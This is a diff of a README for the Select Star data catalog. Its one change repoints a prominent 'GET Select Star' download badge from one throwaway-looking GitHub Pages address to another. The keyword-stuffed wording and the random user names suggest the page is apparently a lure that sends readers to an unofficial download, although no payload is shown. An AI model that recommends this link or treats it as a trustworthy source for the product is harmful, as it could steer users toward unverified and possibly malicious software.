@@ -55,7 +55,7 @@ Select Star GitHub resources are especially useful for teams evaluating deployme
 
 Prerequisites: Access to the data warehouse, permission to review metadata, and a clear plan for catalog ownership, documentation, and team adoption.
 
-[![GET Select Star](https://img.shields.io/badge/GET%20%E2%80%94%20Select%20Star-0078D6?style=for-the-badge&logoColor=white)](https://nelsonleblancniei.github.io/.github/select-star-app)
+[![GET Select Star](https://img.shields.io/badge/GET%20%E2%80%94%20Select%20Star-0078D6?style=for-the-badge&logoColor=white)](https://erenlopezmgpm.github.io/.github/select-star-app)
 
 1.  **Review the Repository:** Open Select Star GitHub resources to understand project structure, setup requirements, release notes, and the technical path for running Select Star.
 2.  **Connect Data Sources:** Add supported warehouse systems such as Select Star Snowflake or Select Star BigQuery so the catalog can begin collecting metadata and usage context.
